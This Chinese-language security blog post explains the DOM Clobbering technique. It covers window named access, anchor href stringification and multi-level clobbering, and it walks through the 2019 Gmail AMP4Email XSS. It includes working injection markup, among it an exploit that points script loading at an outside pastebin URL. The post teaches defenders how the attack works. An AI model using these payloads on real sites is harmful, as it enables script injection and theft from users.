---
title: 淺談 DOM Clobbering 的原理及應用
catalog: true
date: 2021-01-23 13:34:51
tags: [Web,JavaScript,Front-end,Security]
categories:
  - Security
---

## 前言

說身為一個前端工程師，理所當然會知道很多與前端相關的知識，像是 HTML 或是 JS 相關的東西，但那些知識通常都與「使用」有關。例如說我知道寫 HTML 的時候要 semantic，要使用正確的標籤；我知道 JS 應該要怎麼用。可是呢，有些知識雖然也跟網頁有關，卻不是前端工程師平常會接觸到的。

我所謂的「有些知識」，指的其實是「資訊安全相關的知識」。有些在資訊安全裡面常見的觀念，雖然跟網頁有關，卻是我們不太熟悉的東西，而我認為理解這些其實是很重要的。因為你必須懂得怎麼攻擊才能防禦，要先知道攻擊手法跟原理，才知道該怎麼防範這些攻擊。

<!-- more -->


在正式開始之前，先給大家一個趣味題目小試身手。

假設你有一段程式碼，有一個按鈕以及一段 script，如下所示：

``` html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
  <button id="btn">click me</buttin>
  <script>
    // TODO: add click event listener to button
  </script>
</body>
</html>
```

現在請你嘗試用「最短的程式碼」，實作出「點下按鈕時會跳出 alert(1)」這個功能。

舉例來說，這樣寫可以達成目標：

``` js
document.getElementById('btn')
  .addEventListener('click', () => {
    alert(1)
  })
```

那如果要讓程式碼最短，你的答案會是什麼？

大家可以在往下看以前先想一下這個問題，想好以後就讓我們正式開始吧！

防雷
.  
.  
.  
.  
.  
.  
.  
.  
.  
.  
.  
.  
.  

## DOM 與 window 的量子糾纏

你知道 DOM 裡面的東西，有可能影響到 window 嗎？

這個行為是我幾年前在臉書的前端社群無意間得知的，那就是你在 HTML 裡面設定一個有 id 的元素之後，在 JS 裡面就可以直接存取到它：

``` html
<button id="btn">click me</buttin>
<script>
  console.log(window.btn) // <button id="btn">click me</buttin>
</script>
```

然後因為 JS 的 scope，所以你就算直接用 `btn` 也可以，因為當前的 scope 找不到就會往上找，一路找到 window。

所以開頭那題，答案是：

``` js
btn.onclick = () => alert(1)
```

不需要 getElementById，也不需要 querySelector，只要直接用跟 id 同名的變數去拿，就可以拿得到。應該不會有比這個更短的程式碼了（有的話歡迎留言打臉我QQ）

而這個行為是有明確定義在 spec 上的，在 [7.3.3 Named access on the Window object](https://html.spec.whatwg.org/multipage/window-object.html#named-access-on-the-window-object)：

![](/img/security/dom-clobbering/p1.png)

幫大家節錄兩個重點：

1. the value of the name content attribute for all `embed`, `form`, `img`, and `object` elements that have a non-empty name content attribute
2. the value of the `id` content attribute for all HTML elements that have a non-empty id content attribute

也就是說除了 id 可以直接用 window 存取到以外，`embed`, `form`, `img` 跟 `object` 這四個 tag 用 name 也可以存取到：

``` html
<embed name="a"></embed>
<form name="b"></form>
<img name="c" />
<object name="d"></object>
```

但是知道這個有什麼用呢？有，理解這個規格之後，我們可以得出一個結論：

> 我們是有機會透過 HTML 元素來影響 JS 的

而這個手法用在攻擊上，就是標題的 DOM Clobbering。之前是因為這個攻擊才第一次聽到 clobbering 這個單字的，去查一下發現在 CS 領域中有覆蓋的意思，就是透過 DOM 把一些東西覆蓋掉以達成攻擊的手段。

## DOM Clobbering 入門

那在什麼場景之下有機會用 DOM Clobbering 攻擊呢？

首先，你必須有機會在頁面上顯示你自訂的 HTML，否則就沒有辦法了。所以一個可以攻擊的場景可能會像是這樣：

``` html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <h1>留言板</h1>
  <div>
    你的留言：哈囉大家好
  </div> 
  <script>
    if (window.TEST_MODE) {
      // load test script
      var script = document.createElement('script')
      script.src = window.TEST_SCRIPT_SRC
      document.body.appendChild(script)
    }
  </script>
</body>
</html>
```

假設現在有一個留言板，你可以輸入任意內容，但是你的輸入在 server 端會透過 [DOMPurify](https://github.com/cure53/DOMPurify) 來做處理，把任何可以執行 JavaScript 的東西給拿掉，所以 `<script></script>` 會被刪掉，`<img src=x onerror=alert(1)>` 的 `onerror` 會被拿掉，還有許多 XSS payload 都沒有辦法過關。

簡而言之，你沒辦法執行 JavaScript 來達成 XSS，因為這些都被過濾掉了。

但是因為種種因素，並不會過濾掉 HTML 標籤，所以你可以做的事情是顯示自訂的 HTML。只要沒有執行 JS，你想要插入什麼 HTML 標籤，設置什麼屬性都可以。

所以呢，你可以這樣做：

``` html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <h1>留言板</h1>
  <div>
    你的留言：<div id="TEST_MODE"></div>
    <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>
  </div> 
  <script>
    if (window.TEST_MODE) {
      // load test script
      var script = document.createElement('script')
      script.src = window.TEST_SCRIPT_SRC
      document.body.appendChild(script)
    }
  </script>
</body>
</html>
```

根據我們上面所得到的知識，可以插入一個 id 是 TEST_MODE 的標籤 `<div id="TEST_MODE"></div>`，這樣底下 JS 的 `if (window.TEST_MODE)` 就會過關，因為 `window.TEST_MODE` 會是這個 div 元素。

再來我們可以用 `<a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>`，來讓 `window.TEST_SCRIPT_SRC` 轉成字串之後變成我們想要的字。

在大多數的狀況中，只是把一個變數覆蓋成 HTML 元素是不夠的，例如說你把上面那段程式碼當中的 window.TEST_MODE 轉成字串印出來：

``` js
// <div id="TEST_MODE" />
console.log(window.TEST_MODE + '')
```

結果會是：`[object HTMLDivElement]`。

把一個 HTML 元素轉成字串就是這樣，會變成這種形式，如果是這樣的話那基本上沒辦法利用。但幸好在 HTML 裡面有兩個元素在 toString 的時候會做特殊處理：`<base>` 跟 `<a>`：

![](/img/security/dom-clobbering/p2.png)

來源：[4.6.3 API for a and area elements](https://html.spec.whatwg.org/#api-for-a-and-area-elements)

這兩個元素在 toString 的時候會回傳 URL，而我們可以透過 href 屬性來設置 URL，就可以讓 toString 之後的內容可控。

所以綜合以上手法，我們學到了：

1. 用 HTML 搭配 id 屬性影響 JS 變數
2. 用 a 搭配 href 以及 id 讓元素 toString 之後變成我們想要的值

透過上面這兩個手法再搭配適合的場景，就有機會利用 DOM Clobbering 來做攻擊。

不過這邊要提醒大家一件事，如果你想攻擊的變數已經存在的話，你用 DOM 是覆蓋不掉的，例如說：

``` html
<!DOCTYPE html>
<html>
<head>
  <script>
    TEST_MODE = 1
  </script>
</head>
<body>
  <div id="TEST_MODE"></div> 
  <script>
    console.log(window.TEST_MODE) // 1
  </script>
</body>
</html>
```

## 多層級的 DOM Clobbering

在前面的範例中，我們用 DOM 把 `window.TEST_MODE` 蓋掉，創造出未預期的行為。那如果要蓋掉的對象是個物件，有機會嗎？

例如說 `window.config.isTest`，這樣也可以用 DOM clobbering 蓋掉嗎？

有幾種方法可以蓋掉，第一種是利用 HTML 標籤的層級關係，具有這樣特性的是 form，表單這個元素：

在 HTML 的 [spec](https://www.w3.org/TR/html52/sec-forms.html) 中有這樣一段：

![](/img/security/dom-clobbering/p3.png)


可以利用 `form[name]` 或是 `form[id]` 去拿它底下的元素，例如說：

``` html
<!DOCTYPE html>
<html>
<body>
  <form id="config">
    <input name="isTest" />
    <button id="isProd"></button>
  </form>
  <script>
    console.log(config) // <form id="config">
    console.log(config.isTest) // <input name="isTest" />
    console.log(config.isProd) // <button id="isProd"></button>
  </script>
</body>
</html>
```

如此一來就可以構造出兩層的 DOM clobbering。不過有一點要注意，那就是這邊沒有 a 可以用，所以 toString 之後都會變成沒辦法利用的形式。

這邊比較有可能利用的機會是，當你要覆蓋的東西是用 `value` 存取的時候，例如說：`config.enviroment.value`，就可以利用 input 的 value 屬性做覆蓋：

``` js
<!DOCTYPE html>
<html>
<body>
  <form id="config">
    <input name="enviroment" value="test" />
  </form>
  <script>
    console.log(config.enviroment.value) // test
  </script>
</body>
</html>
```

簡單來說呢，就是只有那些內建的屬性可以覆蓋，其他是沒有辦法的。

除了利用 HTML 本身的層級以外，還可以利用另外一個特性：HTMLCollection。

在我們稍早看到的關於 `Named access on the Window object` 的 spec 當中，決定值是什麼的段落是這樣寫的：

![](/img/security/dom-clobbering/p4.png)


如果要回傳的東西有多個，就回傳 HTMLCollection。

``` html
<!DOCTYPE html>
<html>
<body>
  <a id="config"></a>
  <a id="config"></a>
  <script>
    console.log(config) // HTMLCollection(2)
  </script>
</body>
</html>
```

那有了 HTMLCollection 之後可以做什麼呢？在 [4.2.10.2. Interface HTMLCollection](https://dom.spec.whatwg.org/#interface-htmlcollection) 中有寫到，可以利用 name 或是 id 去拿 HTMLCollection 裡面的元素。

![](/img/security/dom-clobbering/p5.png)


像是這樣：

``` html
<!DOCTYPE html>
<html>
<body>
  <a id="config"></a>
  <a id="config" name="apiUrl" href="https://huli.tw"></a>
  <script>
    console.log(config.apiUrl + '')
    // https://huli.tw
  </script>
</body>
</html>
```

就可以透過同名的 id 產生出 HTMLCollection，再用 name 來抓取 HTMLCollection 的特定元素，一樣可以達到兩層的效果。

而如果我們把 form 跟 HTMLCollection 結合在一起，就能夠達成三層：

``` html
<!DOCTYPE html>
<html>
<body>
  <form id="config"></form>
  <form id="config" name="prod">
    <input name="apiUrl" value="123" />
  </form>
  <script>
    console.log(config.prod.apiUrl.value) //123
  </script>
</body>
</html>
```

先利用同名的 id，讓 `config` 可以拿到 HTMLCollection，再來用 `config.prod` 就可以拿到 HTMLCollection 中 name 是 prod 的元素，也就是那個 form，接著就是 `form.apiUrl` 拿到表單底下的 input，最後用 value 拿到裡面的屬性。

所以如果最後要拿的屬性是 HTML 的屬性，就可以四層，否則的話就只能三層。

## 再更多層級的 DOM Clobbering

前面提到三層或是有條件的四層已經是極限了，那有沒有辦法再突破限制呢？

根據 [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back) 裡面給的做法，有，利用 iframe 就可以達到！

當你建了一個 iframe 並且給它一個 name 的時候，用這個 name 就可以指到 iframe 裡面的 window，所以可以像這樣：

``` html
<!DOCTYPE html>
<html>
<body>
  <iframe name="config" srcdoc='
    <a id="apiUrl"></a>
  '></iframe>
  <script>
    setTimeout(() => {
      console.log(config.apiUrl) // <a id="apiUrl"></a>
    }, 500)
  </script>
</body>
</html>
```

這邊之所以會需要 setTimeout 是因為 iframe 並不是同步載入的，所以需要一些時間才能正確抓到 iframe 裡面的東西。

有了 iframe 的幫助之後，就可以創造出更多層級：

``` html
<!DOCTYPE html>
<html>
<body>
  <iframe name="moreLevel" srcdoc='
    <form id="config"></form>
    <form id="config" name="prod">
      <input name="apiUrl" value="123" />
    </form>
  '></iframe>
  <script>
    setTimeout(() => {
      console.log(moreLevel.config.prod.apiUrl.value) //123
    }, 500)
  </script>
</body>
</html>
```

理論上你可以在 iframe 裡面再用一個 iframe，就可以達成無限多層級的 DOM clobbering，不過我試了一下發現可能有點編碼的問題需要處理，例如說像是這樣：

``` html
<!DOCTYPE html>
<html>
<body>
  <iframe name="level1" srcdoc='
    <iframe name="level2" srcdoc="
      <iframe name="level3"></iframe>
    "></iframe>
  '></iframe>
  <script>
    setTimeout(() => {
      console.log(level1.level2.level3) // undefined
    }, 500)
  </script>
</body>
</html>
```

印出來會是 undefined，但如果把 level3 的那兩個雙引號拿掉，直接寫成 `name=level3` 就可以成功印出東西來，我猜是因為單引號雙引號的一些解析問題造成的，目前還沒找到什麼解法，只嘗試了這樣是 ok 的，但是再往下就出錯了：

``` html
<!DOCTYPE html>
<html>
<body>
  <iframe name="level1" srcdoc="
    <iframe name=&quot;level2&quot; srcdoc=&quot;
      <iframe name='level3' srcdoc='
        <iframe name=level4></iframe>
      '></iframe>
    &quot;></iframe>
  "></iframe>
  <script>
    setTimeout(() => {
      console.log(level1.level2.level3.level4)
    }, 500)
  </script>
</body>
</html>
```

但現實生活中應該也不會到這麼深的層級啦，所以四層頂多五層就已經很夠用了。

## 實際案例研究：Gmail AMP4Email XSS

在 2019 年的時候 Gmail 有一個漏洞就是透過 DOM clobbering 來攻擊的，完整的 write up 在這邊：[XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)，底下我就稍微講一下過程（內容都取材自上面這篇文章）。

簡單來說呢，在 Gmail 裡面你可以使用部分 AMP 的功能，然後 Google 針對這個格式的 validator 很嚴謹，所以沒有辦法透過一般的方法 XSS。

但是有人發現可以在 HTML 元素上面設置 id，又發現當他設置了一個 `<a id="AMP_MODE">` 之後，console 突然出現一個載入 script 的錯誤，而且網址中的其中一段是 undefined。仔細去研究程式碼之後，有一段程式碼大概是這樣的：

``` js
var script = window.document.createElement("script");
script.async = false;

var loc;
if (AMP_MODE.test && window.testLocation) {
    loc = window.testLocation
} else {
    loc = window.location;
}

if (AMP_MODE.localDev) {
    loc = loc.protocol + "//" + loc.host + "/dist"
} else {
    loc = "https://cdn.ampproject.org";
}

var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";

document.head.appendChild(b);
```

如果我們能讓 `AMP_MODE.test` 跟 `AMP_MODE.localDev` 都是 truthy 的話，再搭配設置 `window.testLocation`，就能夠載入任意的 script！

所以 exploit 會長的像這樣：

``` html
// 讓 AMP_MODE.test 跟 AMP_MODE.localDev 有東西
<a id="AMP_MODE" name="localDev"></a>
<a id="AMP_MODE" name="test"></a>

// 設置 testLocation.protocol
<a id="testLocation"></a>
<a id="testLocation" name="protocol" 
   href="https://pastebin.com/raw/0tn8z0rG#"></a>
```

最後就能成功載入任意 script，進而達成 XSS！（不過當初作者只有試到這一步就被 CSP 擋住了）。

這應該是 DOM Clobbering 最有名的案例之一了。

## 總結

雖然說 DOM Clobbering 的使用場合有限，但真的是個相當有趣的攻擊方式！而且如果你不知道這個 feature 的話，可能完全沒想過可以透過 HTML 來影響全域變數的內容。

如果對這個攻擊手法有興趣的，可以參考 PortSwigger 的[文章](https://portswigger.net/web-security/dom-based/dom-clobbering)，裡面提供了兩個 lab 讓大家親自嘗試這個攻擊手法，光看是沒用的，要實際下去攻擊才更能體會。

參考資料：

1. [使用 Dom Clobbering 扩展 XSS](http://blog.zeddyu.info/2020/03/04/Dom-Clobbering/#HTML-Relationships)
2. [DOM Clobbering strikes back](https://portswigger.net/research/dom-clobbering-strikes-back)
3. [DOM Clobbering Attack学习记录.md](https://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)
4. [DOM Clobbering学习记录](https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)
5. [XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)
6. [Is there a spec that the id of elements should be made global variable?](https://stackoverflow.com/questions/6381425/is-there-a-spec-that-the-id-of-elements-should-be-made-global-variable)
7. [Why don't we just use element IDs as identifiers in JavaScript?](https://stackoverflow.com/questions/25325221/why-dont-we-just-use-element-ids-as-identifiers-in-javascript)
8. [Do DOM tree elements with ids become global variables?](https://stackoverflow.com/questions/3434278/do-dom-tree-elements-with-ids-become-global-variables)
